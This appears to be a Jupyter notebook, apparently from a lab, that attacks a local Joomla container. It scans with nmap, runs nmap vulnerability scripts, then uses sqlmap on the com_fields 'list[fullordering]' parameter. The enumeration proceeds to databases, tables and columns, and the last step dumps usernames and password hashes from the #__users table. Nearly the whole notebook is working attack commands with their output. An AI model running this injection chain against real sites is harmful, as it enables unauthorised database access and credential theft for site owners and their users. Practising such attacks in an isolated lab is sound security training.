# %%
import os

# %% [markdown]
# Importation des module snecessaire

# %%
os.system('nmap')

# %% [markdown]
# Importation des module snecessaire

# %%
os.system('nmap')
# Out:
# Nmap 7.80 ( https://nmap.org )
# Usage: nmap [Scan Type(s)] [Options] {target specification}
# TARGET SPECIFICATION:
#   Can pass hostnames, IP addresses, networks, etc.
#   Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
#   -iL <inputfilename>: Input from list of hosts/networks
#   -iR <num hosts>: Choose random targets
#   --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
#   --excludefile <exclude_file>: Exclude list from file
# HOST DISCOVERY:
#   -sL: List Scan - simply list targets to scan
#   -sn: Ping Scan - disable port scan
#   -Pn: Treat all hosts as online -- skip host discovery
#   -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
#   -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
#   -PO[protocol list]: IP Protocol Ping
#   -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
#   --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
# ...

# %%
os.system('nmap -u php')
# Out:
# Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 06:55 UTC
# Nmap scan report for php (172.18.0.4)
# Host is up (0.0042s latency).
# rDNS record for 172.18.0.4: joomla-php-370.docker-joomla-master-370_default
# Not shown: 999 closed ports
# PORT   STATE SERVICE
# 80/tcp open  http
#
# Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
# 0

# %%
os.system('nmap -u php -p 80 --script vuln')
# Out:
# Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 07:06 UTC
# Nmap scan report for php (172.18.0.4)
# Host is up (0.0054s latency).
# rDNS record for 172.18.0.4: joomla-php-370.docker-joomla-master-370_default
#
# PORT   STATE SERVICE
# 80/tcp open  http
# |_clamav-exec: ERROR: Script execution failed (use -d to debug)
# | http-csrf:
# | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=php
# |   Found the following possible CSRF vulnerabilities:
# |
# |     Path: http://php:80/
# |     Form id: mod-search-searchword63
# |     Form action: /index.php
# |
# |     Path: http://php:80/
# |     Form id: login-form
# |     Form action: /index.php
# |
# |     Path: http://php:80/index.php/login
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/login
# |
# |     Path: http://php:80/index.php/login
# |     Form id: username-lbl
# |     Form action: /index.php/login?task=user.login
# |
# |     Path: http://php:80/index.php/using-joomla/getting-help
# ...

# %%
os.system('sqlmap -u "http://php/index.php?option=com_fields&view=fields&layout=modal"')
# Out:
#         ___
#        __H__
#  ___ ___["]_____ ___ ___  {1.4.4#stable}
# |_ -| . [']     | .'| . |
# |___|_  ["]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 07:12:02 /2022-04-20/
#
# >?47h8[07:12:03] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://php:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('16ecd03278f46e4a6f358c90f0c01dd3=ecc7184eb3d...70983ff8e3'). Do you want to use those [Y/n] Y
# [07:12:05] [INFO] checking if the target is protected by some kind of WAF/IPS
# ...

# %%
os.system('sqlmap -hh')
# Out:
#         ___
#        __H__
#  ___ ___[(]_____ ___ ___  {1.4.4#stable}
# |_ -| . [(]     | .'| . |
# |___|_  [,]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# Usage: python3 sqlmap [options]
#
# Options:
#   -h, --help            Show basic help message and exit
#   -hh                   Show advanced help message and exit
#   --version             Show program's version number and exit
#   -v VERBOSE            Verbosity level: 0-6 (default 1)
#
#   Target:
#     At least one of these options has to be provided to define the
#     target(s)
#
#     -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
#     -d DIRECT           Connection string for direct database connection
#     -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
#     -m BULKFILE         Scan multiple targets given in a textual file
#     -r REQUESTFILE      Load HTTP request from a file
# ...

# %%
os.system('sqlmap -u "http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*"')
# Out:
#         ___
#        __H__
#  ___ ___[.]_____ ___ ___  {1.4.4#stable}
# |_ -| . [.]     | .'| . |
# |___|_  ["]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 07:19:42 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [07:19:43] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [07:19:43] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://php:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# ...

# %%
os.system('sqlmap -u "http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbs')
# Out:
#         ___
#        __H__
#  ___ ___[)]_____ ___ ___  {1.4.4#stable}
# |_ -| . [,]     | .'| . |
# |___|_  ["]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 07:41:32 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [07:41:33] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [07:41:33] [INFO] resuming back-end DBMS 'mysql'
# [07:41:33] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://php:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# ...

# %%
os.system('sqlmap -u "http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D ead_bd --tables')
# Out:
#         ___
#        __H__
#  ___ ___[.]_____ ___ ___  {1.4.4#stable}
# |_ -| . [)]     | .'| . |
# |___|_  ["]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 07:42:02 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [07:42:02] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [07:42:02] [INFO] resuming back-end DBMS 'mysql'
# [07:42:03] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://php:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# ...

# %%
os.system('sqlmap -u "http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D ead_bd -T "#__users" --columns')
# Out:
#         ___
#        __H__
#  ___ ___[']_____ ___ ___  {1.4.4#stable}
# |_ -| . [)]     | .'| . |
# |___|_  [,]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 07:44:03 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [07:44:03] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [07:44:03] [INFO] resuming back-end DBMS 'mysql'
# [07:44:04] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://php:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# ...

# %%
os.system('sqlmap -u "http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D information_schema --tables')
# Out:
#         ___
#        __H__
#  ___ ___[(]_____ ___ ___  {1.4.4#stable}
# |_ -| . [(]     | .'| . |
# |___|_  [']_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 07:46:56 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [07:46:56] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [07:46:56] [INFO] resuming back-end DBMS 'mysql'
# [07:46:56] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://php:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# ...

# %%
os.system('sqlmap -u "http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D information_schema -T COLUMNS --columns')
# Out:
#         ___
#        __H__
#  ___ ___[.]_____ ___ ___  {1.4.4#stable}
# |_ -| . [.]     | .'| . |
# |___|_  [(]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 07:51:03 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [07:51:03] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [07:51:03] [INFO] resuming back-end DBMS 'mysql'
# [07:51:03] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://php:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# ...

# %%
os.system('sqlmap -u "http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D information_schema -T COLUMNS -C TABLE_NAME,COLUMN_NAME --dump')
# Out:
#         ___
#        __H__
#  ___ ___["]_____ ___ ___  {1.4.4#stable}
# |_ -| . [']     | .'| . |
# |___|_  [(]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 08:36:35 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [08:36:36] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [08:36:36] [INFO] resuming back-end DBMS 'mysql'
# [08:36:36] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://php:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# ...

# %%
os.system('cat /home/jovyan/.sqlmap/output/php/dump/information_schema/COLUMNS.csv | grep "#__users"')
# Out:
# #__users,name
# #__users,username
# #__users,block
# #__users,email
# #__users,id
# #__users,activation
# #__users,otep
# #__users,otpKey
# #__users,lastResetTime
# #__users,params
# #__users,lastvisitDate
# #__users,sendEmail
# #__users,registerDate
# #__users,password
# #__users,requireReset
# #__users,resetCount
# 0

# %%
os.system('sqlmap -u "http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D ead_bd -T "#__users" -C username,password --dump')
# Out:
#         ___
#        __H__
#  ___ ___[,]_____ ___ ___  {1.4.4#stable}
# |_ -| . [(]     | .'| . |
# |___|_  [.]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 08:40:45 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [08:40:46] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [08:40:46] [INFO] resuming back-end DBMS 'mysql'
# [08:40:46] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://php:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# ...
